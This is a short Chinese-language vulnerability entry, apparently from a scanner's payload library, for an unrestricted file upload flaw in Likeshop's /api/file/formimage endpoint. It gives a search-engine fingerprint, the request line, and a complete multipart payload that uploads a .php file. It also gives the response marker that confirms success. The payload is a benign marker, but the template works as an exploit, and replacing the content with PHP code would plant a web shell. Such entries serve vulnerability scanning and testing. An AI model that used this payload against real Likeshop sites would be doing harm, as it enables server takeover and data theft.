# LikeshopHTTPPOST请求File.phpuserFormImage无限制上传漏洞

LikeshopHTTPPOST ｜ 文件上传 ｜ —
- **指纹**：`icon_hash="874152924"`
- **请求**：`POST /api/file/formimage HTTP/1.1`

**Payload**
```
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file";filename="dudesuite.php"
Content-Type: application/x-php
dudesuite
------WebKitFormBoundarygcflwtei--
```
- **响应特征**：200 dudesuite